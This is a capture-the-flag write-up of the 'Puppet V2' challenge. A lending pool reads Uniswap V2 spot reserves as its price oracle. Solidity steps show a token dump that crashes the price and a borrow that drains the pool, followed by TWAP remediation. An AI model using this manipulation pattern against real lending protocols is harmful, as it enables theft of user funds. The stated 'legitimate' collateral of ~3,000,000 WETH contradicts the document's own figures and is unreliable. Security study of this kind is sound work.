# Challenge #8: Puppet V2

- **Difficulty**: Medium
- **Category**: Oracle Manipulation (V2)
- **Severity**: Critical
- **Status**: SOLVED

## Overview

An evolution of the Puppet challenge, this lending pool uses a Uniswap V2 pair as its price oracle instead of V1. The pool holds 1,000,000 DVT tokens and requires 3x collateral in WETH. The Uniswap V2 pair holds 10 WETH and 100 DVT initially. The player starts with 10,000 DVT and 20 ETH.

## Vulnerability

Despite using Uniswap V2, the lending pool still relies on **spot price** rather than the TWAP (Time-Weighted Average Price) that Uniswap V2 makes available:

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    return _getOracleQuote(tokenAmount) * 3 / 1 ether;
}

function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves(uniswapFactory, address(weth), address(token));
    return UniswapV2Library.quote(amount, reservesToken, reservesWETH);
}
```

`UniswapV2Library.quote()` computes: `amountB = amountA * reserveB / reserveA` — a pure spot price calculation. Uniswap V2 exposes `price0CumulativeLast` and `price1CumulativeLast` for TWAP computation, but the pool ignores these entirely.

## Exploit Walkthrough

**Step 1**: Approve and swap all 10,000 DVT for WETH on Uniswap V2:

```solidity
token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);

address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);

uniswapRouter.swapExactTokensForTokens(
    PLAYER_INITIAL_TOKEN_BALANCE,  // 10,000 DVT
    1,                              // min output
    path,
    player,
    block.timestamp
);
```

After the swap, the Uniswap V2 pair holds ~0.1 WETH and 10,100 DVT. The DVT/WETH price collapses.

**Step 2**: Calculate the new collateral requirement:

```
Spot price = 0.1 WETH / 10100 DVT ~ 0.00001 WETH per DVT
Collateral for 1M DVT = 1000000 * 0.00001 * 3 ~ 30 WETH
```

**Step 3**: Wrap remaining ETH to WETH and approve:

```solidity
weth.deposit{value: player.balance}();
weth.approve(address(lendingPool), type(uint256).max);
```

**Step 4**: Borrow the entire lending pool:

```solidity
lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
```

1,000,000 DVT borrowed for ~30 WETH instead of the legitimate ~3,000,000 WETH.

## Real-World Impact

- **Same oracle manipulation pattern as Puppet V1** applies. The migration from Uniswap V1 to V2 did not fix the fundamental issue because the TWAP capability was not utilized.
- **Warp Finance (December 2020, ~$7.8M)**: Used Uniswap V2 LP tokens as collateral with spot price valuation. The attacker performed a flash loan, swapped to manipulate reserves, and borrowed against deflated LP tokens.
- **Cheese Bank (November 2020, ~$3.3M)**: Oracle manipulation via Uniswap V2 spot prices, virtually identical to this challenge.

## Remediation

```solidity
// Fix 1: Use Uniswap V2 TWAP
uint256 public price0CumulativeLast;
uint256 public price1CumulativeLast;
uint32 public blockTimestampLast;
uint256 public price0Average;

function update() external {
    (uint256 price0Cumulative, uint256 price1Cumulative, uint32 blockTimestamp) =
        UniswapV2OracleLibrary.currentCumulativePrices(address(uniswapPair));
    uint32 timeElapsed = blockTimestamp - blockTimestampLast;
    require(timeElapsed >= PERIOD, "Period not elapsed");

    price0Average = (price0Cumulative - price0CumulativeLast) / timeElapsed;
    price0CumulativeLast = price0Cumulative;
    blockTimestampLast = blockTimestamp;
}

// Fix 2: Use Chainlink as primary oracle with Uniswap TWAP as fallback
// Fix 3: Add maximum borrow limits and gradual liquidation thresholds
```

## Key Takeaway

Using Uniswap V2 does not make you safe — you must explicitly implement TWAP; the spot price from reserves is just as manipulable as V1.
